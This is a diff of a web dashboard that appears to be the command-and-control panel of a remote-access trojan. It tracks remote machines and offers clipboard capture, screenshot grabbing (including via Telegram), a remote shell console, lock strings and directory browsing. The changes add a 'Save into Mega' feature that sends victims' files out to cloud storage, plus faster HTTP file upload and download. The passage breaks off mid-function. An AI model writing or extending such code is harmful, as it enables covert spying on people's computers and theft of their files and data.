@@ -205,6 +205,7 @@
   <div id="explorerContextMenu"
     class="hidden fixed z-50 bg-slate-900 text-slate-100 text-xs rounded shadow-lg border border-slate-700 explorer-menu">
     <div class="explorer-menu-item" onclick="copyFromContext()">Copy to Local...</div>
+    <div class="explorer-menu-item" onclick="saveToMegaFromContext()">Save into Mega...</div>
     <div class="explorer-menu-item text-rose-300" onclick="deleteFromContext()">Delete</div>
   </div>
 
@@ -272,41 +273,8 @@
       </div>
     </div>
   </div>
-
-  <!-- Remote Access Modal -->
-  <div id="remoteAccessModal" class="hidden fixed inset-0 z-50 bg-black bg-opacity-80 flex items-center justify-center" tabindex="-1">
-    <div class="bg-slate-950 rounded-2xl shadow-2xl w-[98vw] h-[98vh] max-w-[98vw] max-h-[98vh] flex flex-col border border-slate-700 overflow-hidden">
-      <div class="px-4 py-2 border-b border-slate-700 flex items-center justify-between text-xs text-slate-200">
-        <div class="flex flex-col gap-0.5 flex-1 min-w-0 mr-3">
-          <div class="font-semibold flex items-center gap-2">
-            <span id="remoteAccessTitle">Remote Desktop View</span>
-            <span class="text-[10px] px-2 py-0.5 rounded bg-blue-500/20 text-blue-300 border border-blue-500/30">View Only</span>
-          </div>
-          <div class="text-[10px] text-slate-400 truncate" id="remoteAccessSubtitle"></div>
-        </div>
-        <div class="flex items-center gap-2">
-          <select id="remoteDesktopSelect" class="px-2 py-1 rounded bg-slate-800 text-slate-100 text-[11px] border border-slate-600" onchange="switchRemoteDesktop()">
-            <option value="0">Desktop 1</option>
-          </select>
-          <button onclick="closeRemoteAccess()"
-            class="px-3 py-1 rounded-full bg-slate-800 hover:bg-slate-700 text-sm font-bold text-slate-100 border border-slate-600">&times;</button>
-        </div>
-      </div>
-      <div class="flex-1 overflow-auto bg-slate-900 flex items-center justify-center relative" id="remoteAccessContainer">
-        <div id="remoteAccessLoading" class="absolute inset-0 flex items-center justify-center bg-slate-900 bg-opacity-90 z-10">
-          <div class="text-center">
-            <div class="inline-block animate-spin rounded-full h-12 w-12 border-b-2 border-sky-500 mb-4"></div>
-            <div class="text-slate-300 text-sm">Loading remote desktop...</div>
-          </div>
-        </div>
-        <div id="remoteAccessScreens" class="flex flex-wrap gap-4 p-4 justify-center items-center min-h-full relative">
-          <!-- Screenshots will be inserted here -->
-        </div>
-      </div>
-    </div>
-  </div>
   <script>
-    const SERVER_BASE = "https://detect-server-g5s6.onrender.com";
+    const SERVER_BASE = "https://my-server-ofbx.onrender.com";
     const socket = io(SERVER_BASE, { query: { type: "dashboard" } });
     let clientsInfo = {}; // nodeId: {user, name, address, socketId, state}
     let clipboardLogs = {}; // nodeId: [ ... ]
@@ -422,10 +390,8 @@
       const lockString = typeof node.lockString === "string" && node.lockString.length > 0
         ? node.lockString
         : "";
+      const version = node.version || "unknown";
 
-      const nodeVersion = node.version || "v0";
-      const versionColor = nodeVersion === "v1" ? "bg-emerald-50 text-emerald-700 border-emerald-200" : "bg-amber-50 text-amber-700 border-amber-200";
-      
       return `<div class='bg-white shadow-lg rounded-2xl hover:shadow-2xl border transition-all duration-200 ${expanded ? "border-sky-500 scale-[1.02]" : "border-slate-100"}'>
    <div onclick='toggleExpand("${nodeId}")' class='flex items-center gap-3 px-4 py-3 cursor-pointer group border-b border-slate-100'>
      <span class='text-4xl pointer-events-none select-none'>💻</span>
@@ -433,9 +399,6 @@
       <div class='flex items-center justify-between gap-2'>
         <div class='font-semibold text-sm text-sky-900 truncate flex items-center gap-1.5'>
           <span>${node.user || '?'}</span>
-          <span class='inline-flex items-center gap-1 text-[10px] font-medium px-1.5 py-0.5 rounded-full border ${versionColor}'>
-            ${escapeHtml(nodeVersion)}
-          </span>
         </div>
         <div class='flex items-center gap-1'>
           <span class='inline-flex items-center gap-1 text-[10px] font-medium px-1.5 py-0.5 rounded-full border ${lockStateColor(isLocked)}'>
@@ -449,7 +412,8 @@
         </div>
         </div>
        <div class='text-[11px] text-slate-500 truncate'>${node.address || '?'}<span class='ml-1 text-slate-400'>/ ${nodeId.slice(0, 5)}...</span></div>
-       <div class='mt-1 text-[11px] text-slate-400 truncate'><span class='font-semibold text-slate-500'>Last Clip:</span> ${escapeHtml(lastClipboard)}</div>
+       <div class='mt-1 text-[11px] text-slate-400 truncate'><span class='font-semibold text-slate-500'>Version:</span> ${escapeHtml(version)}</div>
+       <div class='mt-0.5 text-[11px] text-slate-400 truncate'><span class='font-semibold text-slate-500'>Last Clip:</span> ${escapeHtml(lastClipboard)}</div>
        <div class='mt-0.5 text-[11px] text-slate-400 truncate'><span class='font-semibold text-slate-500'>Last Shell:</span> ${escapeHtml(lastShell)}</div>
        <div class='mt-0.5 text-[11px] text-slate-400 truncate'><span class='font-semibold text-slate-500'>Last Lock:</span> ${escapeHtml(lastLockText)}</div>
        <div class='mt-0.5 text-[11px] text-slate-400 truncate'><span class='font-semibold text-slate-500'>Lock String:</span> ${lockString ? escapeHtml(lockString) : "<span class=\"text-slate-300 italic\">(none)</span>"}</div>
@@ -461,7 +425,6 @@
       <button class='px-3 py-1.5 text-[11px] rounded-lg bg-sky-100 text-sky-800 font-semibold hover:bg-sky-200 shadow-sm' onclick='event.stopPropagation(); socket.emit("get_clipboard", "${nodeId}")'>Get Clipboard</button>
       <button class='px-3 py-1.5 text-[11px] rounded-lg bg-green-100 text-green-800 font-semibold hover:bg-green-200 shadow-sm' onclick='event.stopPropagation(); socket.emit("get_screenshots", "${nodeId}")'>Get Screenshots</button>
       <button class='px-3 py-1.5 text-[11px] rounded-lg bg-emerald-100 text-emerald-800 font-semibold hover:bg-emerald-200 shadow-sm' onclick='event.stopPropagation(); socket.emit("get_screenshots_tg", "${nodeId}")'>Get Screenshots by TG</button>
-      <button class='px-3 py-1.5 text-[11px] rounded-lg bg-purple-100 text-purple-800 font-semibold hover:bg-purple-200 shadow-sm' onclick='event.stopPropagation(); openRemoteAccess("${nodeId}")'>Access</button>
       <button class='px-3 py-1.5 text-[11px] rounded-lg bg-slate-800 text-slate-50 font-semibold hover:bg-slate-900 shadow-sm' onclick='event.stopPropagation(); toggleExplorer("${nodeId}")'>${explorerOpen ? "Hide Directory" : "Get Directory"}</button>
       <button class='px-3 py-1.5 text-[11px] rounded-lg bg-slate-900/80 text-slate-50 font-semibold hover:bg-slate-800 shadow-sm' onclick='event.stopPropagation(); toggleConsole("${nodeId}")'>${consoleOpen ? "Hide Console" : "Get Console"}</button>
       <select class='ml-auto rounded border-slate-200 text-[11px] px-2 py-1 shadow-sm bg-white' onchange='event.stopPropagation(); socket.emit("set_clipboard_state", {clientName: "${nodeId}", state: this.value})'>
@@ -585,6 +548,50 @@
       if (ul) ul.scrollTop = ul.scrollHeight;
     }
 
+    // --- Version-aware file transfer (v2+ uses HTTP binary, older uses socket) ---
+    function isHttpCapable(nodeId) {
+      const node = clientsInfo[nodeId];
+      if (!node || !node.version) return false;
+      const ver = parseInt((node.version || "").replace(/\D/g, ""), 10);
+      return ver >= 2;
+    }
+
+    // --- Transfer progress modal ---
+    function showTransferProgress(id, title, fileName, fileSize) {
+      let existing = document.getElementById(`xfer-${id}`);
+      if (existing) existing.remove();
+      const color = title.startsWith("Upload") ? "emerald" : "sky";
+      const modal = document.createElement("div");
+      modal.id = `xfer-${id}`;
+      modal.className = "fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60";
+      modal.innerHTML = `<div class="bg-slate-900 rounded-2xl shadow-2xl w-96 max-w-[90vw] p-6 border border-slate-700">
+        <div class="flex items-center justify-between mb-4">
+          <h3 class="text-lg font-semibold text-slate-100">${title}</h3>
+          <button onclick="this.closest('.fixed').remove()" class="text-slate-400 hover:text-slate-200 text-xl">&times;</button>
+        </div>
+        <div class="text-sm text-slate-300 truncate mb-2">${escapeHtml(fileName)}</div>
+        <div class="text-xs text-slate-400 mb-3" id="xfer-text-${id}">0% (0 / ${formatSize(fileSize)})</div>
+        <div class="w-full bg-slate-800 rounded-full h-2.5 mb-1">
+          <div id="xfer-bar-${id}" class="bg-${color}-500 h-2.5 rounded-full transition-all duration-300" style="width:0%"></div>
+        </div>
+        <div class="text-xs text-slate-500 mt-2" id="xfer-mode-${id}">Preparing...</div>
+      </div>`;
+      document.body.appendChild(modal);
+    }
+    function updateTransferProgress(id, bytes, total) {
+      const t = document.getElementById(`xfer-text-${id}`);
+      const b = document.getElementById(`xfer-bar-${id}`);
+      if (t && b) {
+        const pct = total > 0 ? Math.min(100, Math.round(bytes / total * 100)) : 0;
+        t.textContent = `${pct}% (${formatSize(bytes)} / ${formatSize(total)})`;
+        b.style.width = `${pct}%`;
+      }
+    }
+    function removeTransferProgress(id) {
+      const el = document.getElementById(`xfer-${id}`);
+      if (el) el.remove();
+    }
+
     // --- Upload (paste) local file into remote directory ---
     let uploadContext = null;
     const uploadInput = document.createElement("input");
@@ -600,44 +607,74 @@
     }
 
     uploadInput.addEventListener("change", function () {
-      if (!uploadContext) {
-        uploadInput.value = "";
-        return;
-      }
+      if (!uploadContext) { uploadInput.value = ""; return; }
       const file = uploadInput.files && uploadInput.files[0];
       if (!file) return;
-
       const nodeId = uploadContext.nodeId;
       const view = directoryViews[nodeId] || { path: "" };
       const dirPath = view.path || "";
+      uploadInput.value = "";
+      uploadContext = null;
 
-      const reader = new FileReader();
-      reader.onload = function (e) {
-        const result = e.target && e.target.result;
-        let base64 = "";
-        if (typeof result === "string" && result.startsWith("data:")) {
-          const idx = result.indexOf("base64,");
-          base64 = idx >= 0 ? result.substring(idx + 7) : "";
-        } else if (result instanceof ArrayBuffer) {
-          const bytes = new Uint8Array(result);
-          let binary = "";
-          for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
-          base64 = btoa(binary);
-        }
-        if (!base64) {
-          alert("Failed to read file for upload.");
-          return;
-        }
-        socket.emit("upload_remote_file", {
-          nodeId,
-          path: dirPath || "",
-          name: file.name,
-          contentBase64: base64
-        });
-        uploadInput.value = "";
-        uploadContext = null;
+      if (isHttpCapable(nodeId)) {
+        // v2: HTTP binary upload (no base64, unlimited size)
+        httpUploadFile(nodeId, file, dirPath).catch(err => alert("Upload error: " + (err.message || err)));
+      } else {
+        // v1/v0: socket-based upload (base64, limited size)
+        const reader = new FileReader();
+        reader.onload = function (e) {
+          const result = e.target && e.target.result;
+          let base64 = "";
+          if (typeof result === "string" && result.startsWith("data:")) {
+            const idx = result.indexOf("base64,");
+            base64 = idx >= 0 ? result.substring(idx + 7) : "";
+          } else if (result instanceof ArrayBuffer) {
+            const bytes = new Uint8Array(result);
+            const BLOCK = 32768;
+            let binary = "";
+            for (let j = 0; j < bytes.length; j += BLOCK)
+              binary += String.fromCharCode.apply(null, bytes.subarray(j, Math.min(j + BLOCK, bytes.length)));
+            base64 = btoa(binary);
+          }
+          if (!base64) { alert("Failed to read file for upload."); return; }
+          socket.emit("upload_remote_file", { nodeId, path: dirPath || "", name: file.name, contentBase64: base64 });
+        };
+        reader.readAsDataURL(file);
+      }
+    });
+
+    // v2 HTTP upload function
+    async function httpUploadFile(nodeId, file, dirPath) {
+      const transferId = (crypto.randomUUID ? crypto.randomUUID().replace(/-/g, "") : Date.now().toString(36) + Math.random().toString(36).slice(2));
+      showTransferProgress(transferId, "Uploading File", file.name, file.size);
+      const modeEl = document.getElementById(`xfer-mode-${transferId}`);
+      if (modeEl) modeEl.textContent = "Binary HTTP streaming (no base64)...";
+
+      const pushUrl = `${SERVER_BASE}/api/transfer/${transferId}/push`;
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", pushUrl, true);
+      xhr.setRequestHeader("Content-Type", "application/octet-stream");
+      xhr.upload.onprogress = function (e) {
+        if (e.lengthComputable) updateTransferProgress(transferId, e.loaded, e.total);
       };
-      reader.readAsDataURL(file);
+      const pushDone = new Promise((resolve, reject) => {
+        xhr.onload = () => resolve(xhr.status);
+        xhr.onerror = () => reject(new Error("Network error"));
+        xhr.ontimeout = () => reject(new Error("Timeout"));
+      });
+      xhr.timeout = 0;
+      xhr.send(file);
+
+      socket.emit("upload_file_http", { nodeId, transferId, path: dirPath || "", name: file.name, size: file.size });
+      await pushDone;
+      updateTransferProgress(transferId, file.size, file.size);
+    }
+
+    // v2 HTTP upload complete (from C# client via server)
+    socket.on("upload_complete", ({ client, transferId, success, error }) => {
+      removeTransferProgress(transferId);
+      if (!success) { if (error) alert("Upload failed: " + error); return; }
+      refreshDirectory(client);
     });
     window.handleConsoleKey = function (e, nodeId) {
       if (e.key === "Enter") {
@@ -882,14 +919,43 @@
       closeExplorerMenu();
     });
 
-    window.copyFromContext = function () {
+    let pendingHttpDownload = null; // { nodeId, fileName, fileHandle }
+
+    window.copyFromContext = async function () {
       if (!explorerContext) return;
       if (explorerContext.isDir) {
         alert("Copy is only supported for files at the moment.");
         closeExplorerMenu();
         return;
       }
-      socket.emit("download_remote_file", {
+      const filePath = explorerContext.path;
+      const fileName = filePath.split(/[\\/]/).pop() || "download.bin";
+      const nodeId = explorerContext.nodeId;
+      closeExplorerMenu();
+
+      if (isHttpCapable(nodeId)) {
+        // v2: HTTP binary download
+        let fileHandle = null;
+        if (window.showSaveFilePicker) {
+          try { fileHandle = await window.showSaveFilePicker({ suggestedName: fileName }); }
+          catch (e) { if (e.name === "AbortError") return; fileHandle = null; }
+        }
+        pendingHttpDownload = { nodeId, fileName, fileHandle };
+        socket.emit("download_remote_file_http", { nodeId, path: filePath });
+      } else {
+        // v1/v0: socket-based download
+        socket.emit("download_remote_file", { nodeId, path: filePath });
+      }
+    }
+
+    window.saveToMegaFromContext = function () {
+      if (!explorerContext) return;
+      if (explorerContext.isDir) {
+        alert("Save into Mega is only supported for files at the moment.");
+        closeExplorerMenu();
+        return;
+      }
+      socket.emit("save_to_mega", {
         nodeId: explorerContext.nodeId,
         path: explorerContext.path
       });
@@ -919,319 +985,6 @@
       refreshDirectory(client);
     });
 
-    // Track active file downloads (chunked transfer)
-    const activeDownloads = {}; // fileId: { name, size, chunks: Map, receivedBytes, totalChunks, timeoutId, lastChunkReceived }
-
-    // Show download progress modal
-    function showDownloadProgress(fileId, fileName, fileSize) {
-      // Remove existing progress modal if any
-      let existingModal = document.getElementById(`download-progress-${fileId}`);
-      if (existingModal) {
-        existingModal.remove();
-      }
-
-      const modal = document.createElement("div");
-      modal.id = `download-progress-${fileId}`;
-      modal.className = "fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-60";
-      modal.innerHTML = `
-        <div class="bg-slate-900 rounded-2xl shadow-2xl w-96 max-w-[90vw] p-6 border border-slate-700">
-          <div class="flex items-center justify-between mb-4">
-            <h3 class="text-lg font-semibold text-slate-100">Downloading File</h3>
-            <button onclick="this.closest('.fixed').remove()" class="text-slate-400 hover:text-slate-200 text-xl">&times;</button>
-          </div>
-          <div class="mb-2">
-            <div class="text-sm text-slate-300 truncate mb-2" title="${escapeHtml(fileName)}">${escapeHtml(fileName)}</div>
-            <div class="text-xs text-slate-400 mb-3" id="download-progress-text-${fileId}">0% (0 / ${formatSize(fileSize)})</div>
-            <div class="w-full bg-slate-800 rounded-full h-2.5 mb-1">
-              <div id="download-progress-bar-${fileId}" class="bg-sky-500 h-2.5 rounded-full transition-all duration-300" style="width: 0%"></div>
-            </div>
-          </div>
-          <div class="text-xs text-slate-500">Please wait while the file is being downloaded...</div>
-        </div>
-      `;
-      document.body.appendChild(modal);
-    }
-
-    function updateDownloadProgress(fileId, receivedBytes, totalSize) {
-      const textEl = document.getElementById(`download-progress-text-${fileId}`);
-      const barEl = document.getElementById(`download-progress-bar-${fileId}`);
-      if (textEl && barEl) {
-        const percent = totalSize > 0 ? Math.min(100, Math.round((receivedBytes / totalSize) * 100)) : 0;
-        textEl.textContent = `${percent}% (${formatSize(receivedBytes)} / ${formatSize(totalSize)})`;
-        barEl.style.width = `${percent}%`;
-      }
-    }
-
-    function removeDownloadProgress(fileId) {
-      const modal = document.getElementById(`download-progress-${fileId}`);
-      if (modal) {
-        modal.remove();
-      }
-    }
-
-    // Handle chunked file transfer start
-    socket.on("file_start", ({ client, fileId, path, name, size, error }) => {
-      if (error) {
-        alert("Download failed: " + error);
-        return;
-      }
-      // Clear any existing timeout
-      if (activeDownloads[fileId] && activeDownloads[fileId].timeoutId) {
-        clearTimeout(activeDownloads[fileId].timeoutId);
-      }
-      activeDownloads[fileId] = {
-        name: name || "download.bin",
-        size: size || 0,
-        chunks: new Map(),
-        receivedBytes: 0,
-        totalChunks: 0,
-        timeoutId: null,
-        startTime: Date.now()
-      };
-      showDownloadProgress(fileId, name || "download.bin", size || 0);
-      
-      // Set a timeout in case download stalls (5 minutes)
-      activeDownloads[fileId].timeoutId = setTimeout(() => {
-        if (activeDownloads[fileId]) {
-          alert(`Download timeout for ${name || "file"}. Some chunks may be missing.`);
-          removeDownloadProgress(fileId);
-          delete activeDownloads[fileId];
-        }
-      }, 5 * 60 * 1000);
-    });
-
-    // Handle file chunks
-    socket.on("file_chunk", ({ client, fileId, chunkIndex, chunkBase64, isLast, chunkSize }) => {
-      if (!activeDownloads[fileId]) {
-        console.warn("Received chunk for unknown file:", fileId);
-        return;
-      }
-      
-      // Validate chunk data
-      if (typeof chunkBase64 !== "string" || chunkBase64.length === 0) {
-        console.error(`Invalid chunk ${chunkIndex} for file ${fileId}: empty or not a string`);
-        return;
-      }
-      
-      const download = activeDownloads[fileId];
-      
-      // Clean the chunk: remove whitespace and invalid characters
-      // IMPORTANT: Don't remove padding yet - we'll handle it during reassembly
-      let cleanedChunk = chunkBase64.replace(/\s/g, "").replace(/[^A-Za-z0-9+/=]/g, "");
-      if (cleanedChunk.length === 0) {
-        console.error(`Chunk ${chunkIndex} for file ${fileId} became empty after cleaning`);
-        return;
-      }
-      
-      // Store chunk with metadata
-      download.chunks.set(chunkIndex, {
-        base64: cleanedChunk,
-        isLast: isLast || false,
-        chunkSize: chunkSize || null // Actual byte size if provided
-      });
-      
-      // Calculate actual bytes received (base64 length * 3 / 4, rounded down)
-      // For chunks that are multiples of 3 bytes, base64 length should be multiple of 4
-      const chunkBytes = Math.floor(cleanedChunk.length * 3 / 4);
-      download.receivedBytes += chunkBytes;
-      
-      // Update progress
-      updateDownloadProgress(fileId, download.receivedBytes, download.size);
-      
-      if (isLast) {
-        download.totalChunks = chunkIndex + 1;
-        download.lastChunkReceived = true;
-        download.lastChunkIndex = chunkIndex;
-        
-        // Wait a bit to ensure all chunks arrive (they might be slightly out of order)
-        setTimeout(() => {
-          if (activeDownloads[fileId]) {
-            // Check if we have all chunks before processing
-            let allChunksReceived = true;
-            const missingChunks = [];
-            for (let i = 0; i < download.totalChunks; i++) {
-              if (!download.chunks.has(i)) {
-                allChunksReceived = false;
-                missingChunks.push(i);
-              }
-            }
-            
-            if (allChunksReceived) {
-              // All chunks received, process immediately
-              if (download.timeoutId) {
-                clearTimeout(download.timeoutId);
-              }
-              processChunkedFile(fileId);
-            } else {
-              // Still missing chunks, wait a bit more
-              console.warn(`File ${fileId} missing chunks:`, missingChunks.slice(0, 10));
-              setTimeout(() => {
-                if (activeDownloads[fileId]) {
-                  if (activeDownloads[fileId].timeoutId) {
-                    clearTimeout(activeDownloads[fileId].timeoutId);
-                  }
-                  processChunkedFile(fileId);
-                }
-              }, 3000);
-            }
-          }
-        }, 500);
-      }
-    });
-
-    // Handle file complete
-    socket.on("file_complete", ({ client, fileId, path, name, size, error }) => {
-      if (error) {
-        alert("Download failed: " + error);
-        removeDownloadProgress(fileId);
-        delete activeDownloads[fileId];
-        return;
-      }
-      // File processing should already be triggered by the last chunk
-      // This is just a confirmation
-    });
-
-    // Process and download the reassembled file
-    function processChunkedFile(fileId) {
-      const download = activeDownloads[fileId];
-      if (!download) return;
-
-      try {
-        // Reassemble chunks in order
-        const chunkArray = [];
-        const missingChunks = [];
-        for (let i = 0; i < download.totalChunks; i++) {
-          const chunkData = download.chunks.get(i);
-          if (!chunkData) {
-            missingChunks.push(i);
-            continue;
-          }
-          
-          // Handle both old format (string) and new format (object)
-          let chunkBase64;
-          if (typeof chunkData === "string") {
-            chunkBase64 = chunkData;
-          } else if (chunkData.base64) {
-            chunkBase64 = chunkData.base64;
-          } else {
-            missingChunks.push(i);
-            continue;
-          }
-          
-          // Clean chunk (should already be cleaned, but do it again to be safe)
-          chunkBase64 = chunkBase64.replace(/\s/g, "").replace(/[^A-Za-z0-9+/=]/g, "");
-          if (chunkBase64.length === 0) {
-            missingChunks.push(i);
-            continue;
-          }
-          
-          // For all chunks except the last one, remove any padding
-          // Padding should only appear in the last chunk
-          const isLastChunk = (i === download.lastChunkIndex) || chunkData.isLast;
-          if (!isLastChunk) {
-            // Remove padding from middle chunks (shouldn't have any if C# sends correctly)
-            chunkBase64 = chunkBase64.replace(/=+$/, "");
-          }
-          
-          chunkArray.push(chunkBase64);
-        }
-
-        if (missingChunks.length > 0) {
-          alert(`Missing ${missingChunks.length} chunk(s) (${missingChunks.slice(0, 5).join(", ")}${missingChunks.length > 5 ? "..." : ""}) for file download. Download may be incomplete.`);
-          removeDownloadProgress(fileId);
-          delete activeDownloads[fileId];
-          return;
-        }
-
-        // Combine all chunks
-        let fullBase64 = chunkArray.join("");
-        
-        // Final cleanup - remove any whitespace or invalid characters
-        fullBase64 = fullBase64.replace(/\s/g, "").replace(/[^A-Za-z0-9+/=]/g, "");
-        
-        // Basic validation
-        if (fullBase64.length === 0) {
-          throw new Error("Base64 string is empty after combining chunks");
-        }
-        
-        // Fix padding at the end - base64 length must be multiple of 4
-        // Remove any existing padding first
-        fullBase64 = fullBase64.replace(/=+$/, "");
-        // Add correct padding (0, 1, or 2 padding characters)
-        const remainder = fullBase64.length % 4;
-        if (remainder !== 0) {
-          fullBase64 = fullBase64 + "=".repeat(4 - remainder);
-        }
-        
-        // Log for debugging large files
-        if (download.size > 1024 * 1024) {
-          console.log(`Processing large file: ${download.name}, size: ${download.size}, base64 length: ${fullBase64.length}, chunks: ${download.totalChunks}`);
-        }
-        
-        // Convert base64 to binary with error handling
-        let byteArray;
-        try {
-          // Decode base64 to binary string
-          const byteCharacters = atob(fullBase64);
-          
-          // Convert binary string to Uint8Array (more efficient than Array)
-          byteArray = new Uint8Array(byteCharacters.length);
-          for (let i = 0; i < byteCharacters.length; i++) {
-            byteArray[i] = byteCharacters.charCodeAt(i);
-          }
-        } catch (e) {
-          console.error("Base64 decoding failed:", e);
-          throw new Error(`Failed to decode base64: ${e.message}. Base64 length: ${fullBase64.length}, Expected size: ${download.size || "unknown"} bytes`);
-        }
-        
-        // Create blob from byte array
-        const blob = new Blob([byteArray], { type: "application/octet-stream" });
-        
-        // Verify blob size matches expected file size exactly
-        const expectedSize = download.size || 0;
-        if (expectedSize > 0) {
-          if (blob.size !== expectedSize) {
-            const sizeDiff = Math.abs(blob.size - expectedSize);
-            // For files, we should match exactly (or very close due to base64 encoding)
-            // Allow 1 byte tolerance for rounding errors
-            if (sizeDiff > 1) {
-              const errorMsg = `File size mismatch: expected ${expectedSize} bytes, got ${blob.size} bytes (difference: ${sizeDiff}). ` +
-                `This may indicate corrupted or incomplete download.`;
-              console.error(errorMsg);
-              throw new Error(errorMsg);
-            }
-          }
-        }
-        
-        // Update progress to 100%
-        updateDownloadProgress(fileId, download.size, download.size);
-        
-        // Small delay to show 100% before download
-        setTimeout(() => {
-          // Trigger download
-          const url = URL.createObjectURL(blob);
-          const a = document.createElement("a");
-          a.href = url;
-          a.download = download.name;
-          document.body.appendChild(a);
-          a.click();
-          document.body.removeChild(a);
-          URL.revokeObjectURL(url);
-
-          // Clean up
-          removeDownloadProgress(fileId);
-          delete activeDownloads[fileId];
-        }, 300);
-      } catch (e) {
-        console.error("Error processing downloaded file:", e);
-        const errorMsg = e.message || String(e);
-        alert("Error processing downloaded file: " + errorMsg + "\n\nPlease try downloading again. If the problem persists, the file may be too large or corrupted.");
-        removeDownloadProgress(fileId);
-        delete activeDownloads[fileId];
-      }
-    }
-
-    // Legacy file_data handler (for backward compatibility with small files)
     socket.on("file_data", ({ client, path, name, size, contentBase64, error }) => {
       if (error) {
         alert("Download failed: " + error);
@@ -1262,546 +1015,86 @@
       }
     });
 
+    socket.on("mega_save_result", ({ client, path, success, url, error }) => {
+      if (!success) {
+        if (error) alert("Save into Mega failed: " + error);
+        return;
+      }
+      let msg = "Saved into Mega:\n" + (path || "");
+      if (url) msg += "\nLink: " + url;
+      alert(msg);
+    });
+
     socket.on("upload_result", ({ client, path, name, success, error }) => {
       if (!success) {
         if (error) alert("Upload failed: " + error);
         return;
       }
-      // Refresh the current directory view for that client
       refreshDirectory(client);
     });
 
-    // Remote Access Variables
-    let activeRemoteNodeId = null;
-    let remoteScreens = {}; // nodeId: { screens: [{base64, screenIdx, actualWidth, actualHeight}], currentScreen: 0 }
-    let remoteAccessActive = false;
-    let remoteUpdateInterval = null;
-    let lastMouseMoveTime = 0;
-    const MOUSE_MOVE_THROTTLE = 50; // Throttle mouse move events to 50ms
-
-    // Open Remote Access Modal
-    window.openRemoteAccess = function (nodeId) {
-      // Set active state first
-      activeRemoteNodeId = nodeId;
-      remoteAccessActive = true;
-      
-      // Initialize screens data structure
-      if (!remoteScreens[nodeId]) {
-        remoteScreens[nodeId] = { screens: [], currentScreen: 0 };
-      }
-      
-      const modal = document.getElementById("remoteAccessModal");
-      const titleEl = document.getElementById("remoteAccessTitle");
-      const subEl = document.getElementById("remoteAccessSubtitle");
-      const loadingEl = document.getElementById("remoteAccessLoading");
-      const screensEl = document.getElementById("remoteAccessScreens");
-      const selectEl = document.getElementById("remoteDesktopSelect");
-      const container = document.getElementById("remoteAccessContainer");
-      
-      if (!modal || !titleEl || !subEl) return;
-      
-      const node = clientsInfo[nodeId] || {};
-      titleEl.textContent = "Remote Desktop Access";
-      subEl.textContent = `${node.user || "User"}@${node.name || "PC"}  —  ${node.address || "?"}  (${nodeId})`;
-      
-      // Show loading
-      if (loadingEl) loadingEl.classList.remove("hidden");
-      if (screensEl) screensEl.innerHTML = "";
-      
-      // Clear desktop select
-      if (selectEl) selectEl.innerHTML = "";
-      
-      // Show modal
-      modal.classList.remove("hidden");
-      
-      // Focus the container to capture keyboard events
-      setTimeout(() => {
-        if (container) {
-          container.focus();
-          container.setAttribute("tabindex", "0");
-        }
-      }, 100);
-      
-      // Request initial remote access screenshot
-      console.log("Requesting remote access for:", nodeId);
-      socket.emit("request_remote_access", { nodeId });
-      
-      // Start periodic updates (every 300ms for real-time viewing)
-      if (remoteUpdateInterval) clearInterval(remoteUpdateInterval);
-      remoteUpdateInterval = setInterval(() => {
-        if (activeRemoteNodeId && remoteAccessActive) {
-          const currentScreen = remoteScreens[activeRemoteNodeId]?.currentScreen || 0;
-          socket.emit("request_remote_screenshot_update", { 
-            nodeId: activeRemoteNodeId,
-            screenIdx: currentScreen
-          });
-        }
-      }, 300); // Real-time viewing updates
-    };
-
-    // Close Remote Access Modal
-    window.closeRemoteAccess = function () {
-      const modal = document.getElementById("remoteAccessModal");
-      if (modal) modal.classList.add("hidden");
-      
-      // Stop periodic updates
-      if (remoteUpdateInterval) {
-        clearInterval(remoteUpdateInterval);
-        remoteUpdateInterval = null;
-      }
-      
-      // Clear state
-      activeRemoteNodeId = null;
-      remoteAccessActive = false;
-    };
-
-    // Switch between desktops
-    window.switchRemoteDesktop = function () {
-      if (!activeRemoteNodeId || !remoteAccessActive) return;
-      const selectEl = document.getElementById("remoteDesktopSelect");
-      if (!selectEl) return;
-      
-      const screenIdx = parseInt(selectEl.value) || 0;
-      const screens = remoteScreens[activeRemoteNodeId];
-      if (screens) {
-        screens.currentScreen = screenIdx;
-        console.log(`Switched to screen ${screenIdx} for node ${activeRemoteNodeId}`);
-        renderRemoteScreens();
-        
-        // Request screenshot update for the newly selected screen
-        socket.emit("request_remote_screenshot_update", { 
-          nodeId: activeRemoteNodeId,
-          screenIdx: screenIdx
-        });
-      }
-    };
-
-    // Render remote screens
-    function renderRemoteScreens() {
-      if (!activeRemoteNodeId || !remoteAccessActive) return;
-      
-      const screensEl = document.getElementById("remoteAccessScreens");
-      const loadingEl = document.getElementById("remoteAccessLoading");
-      const selectEl = document.getElementById("remoteDesktopSelect");
-      const container = document.getElementById("remoteAccessContainer");
-      
-      if (!screensEl) return;
-      
-      const screens = remoteScreens[activeRemoteNodeId];
-      if (!screens || screens.screens.length === 0) {
-        if (loadingEl) loadingEl.classList.remove("hidden");
+    // v2 HTTP download: server signals when C# client is ready to push
+    socket.on("download_ready", async ({ transferId, name, size, error }) => {
+      if (error) {
+        alert("Download failed: " + error);
+        pendingHttpDownload = null;
         return;
       }
-      
-      if (loadingEl) loadingEl.classList.add("hidden");
-      
-      // Update desktop select
-      if (selectEl) {
-        selectEl.innerHTML = screens.screens.map((s, idx) => 
-          `<option value="${idx}" ${idx === screens.currentScreen ? "selected" : ""}>Desktop ${idx + 1}</option>`
-        ).join("");
-      }
-      
-      // Render current screen
-      const currentScreen = screens.screens[screens.currentScreen];
-      if (currentScreen && currentScreen.url) {
-        // Try to reuse existing image to preserve event handlers
-        let img = screensEl.querySelector("img");
-        
-        if (!img) {
-          // Create new image if it doesn't exist
-          img = document.createElement("img");
-          img.className = "max-w-full max-h-full object-contain cursor-default select-none";
-          img.style.userSelect = "none";
-          img.style.pointerEvents = "auto";
-          img.style.cursor = "default"; // View-only cursor
-          img.draggable = false;
-          img.tabIndex = -1; // Not focusable in view-only mode
-          
-          // Prevent context menu
-          img.addEventListener("contextmenu", (e) => {
-            e.preventDefault();
-            e.stopPropagation();
-            return false;
-          });
-          
-          // View-only mode: No mouse/keyboard event handlers
-          // Just prevent default browser behaviors
-          const clickHandler = (e) => {
-            e.preventDefault();
-            e.stopPropagation();
-            // View-only: no actions sent
-          };
-          
-          img.addEventListener("click", clickHandler, false);
-          
-          // Store handlers on image for cleanup if needed
-          img._remoteHandlers = {
